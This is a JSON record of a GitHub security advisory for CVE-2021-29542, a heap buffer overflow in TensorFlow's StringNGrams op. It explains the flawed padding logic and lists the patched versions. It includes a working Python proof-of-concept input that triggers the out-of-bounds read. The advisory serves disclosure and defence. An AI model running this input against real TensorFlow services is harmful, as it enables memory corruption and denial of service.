{
    "ghsaId": "GHSA-4hrh-9vmp-2jgg",
    "severity": "LOW",
    "summary": "Heap buffer overflow in `StringNGrams`",
    "description": "### Impact\nAn attacker can cause a heap buffer overflow by passing crafted inputs to `tf.raw_ops.StringNGrams`:\n\n```python\nimport tensorflow as tf\n\nseparator = b'\\x02\\x00'    \nngram_widths = [7, 6, 11]\nleft_pad = b'\\x7f\\x7f\\x7f\\x7f\\x7f'\nright_pad = b'\\x7f\\x7f\\x25\\x5d\\x53\\x74'\npad_width = 50\npreserve_short_sequences = True\n  \nl = ['', '', '', '', '', '', '', '', '', '', '']\n  \ndata = tf.constant(l, shape=[11], dtype=tf.string)\n  \nl2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,\n     0, 0, 3]\ndata_splits = tf.constant(l2, shape=[116], dtype=tf.int64)\n\nout = tf.raw_ops.StringNGrams(data=data,\n    data_splits=data_splits, separator=separator,\n    ngram_widths=ngram_widths, left_pad=left_pad,\n    right_pad=right_pad, pad_width=pad_width,\n    preserve_short_sequences=preserve_short_sequences)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L171-L185) fails to consider corner cases where input would be split in such a way that the generated tokens should only contain padding elements:\n  \n```cc\nfor (int ngram_index = 0; ngram_index < num_ngrams; ++ngram_index) {\n  int pad_width = get_pad_width(ngram_width);\n  int left_padding = std::max(0, pad_width - ngram_index);\n  int right_padding = std::max(0, pad_width - (num_ngrams - (ngram_index + 1)));\n  int num_tokens = ngram_width - (left_padding + right_padding);\n  int data_start_index = left_padding > 0 ? 0 : ngram_index - pad_width;\n  ...\n  tstring* ngram = &output[ngram_index];\n  ngram->reserve(ngram_size);\n  for (int n = 0; n < left_padding; ++n) {\n    ngram->append(left_pad_);\n    ngram->append(separator_);\n  }\n  for (int n = 0; n < num_tokens - 1; ++n) {\n    ngram->append(data[data_start_index + n]);\n    ngram->append(separator_);\n  }\n  ngram->append(data[data_start_index + num_tokens - 1]); // <<<\n  for (int n = 0; n < right_padding; ++n) {\n    ngram->append(separator_);\n    ngram->append(right_pad_);\n  }\n  ...\n}\n```\n\nIf input is such that `num_tokens` is 0, then, for `data_start_index=0` (when left padding is present), the marked line would result in reading `data[-1]`.\n\n### Patches\nWe have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
    "permalink": "https://github.com/advisories/GHSA-4hrh-9vmp-2jgg",
    "publishedAt": "2021-05-21T14:23:15Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-4hrh-9vmp-2jgg"
        },
        {
            "type": "CVE",
            "value": "CVE-2021-29542"
        }
    ]
}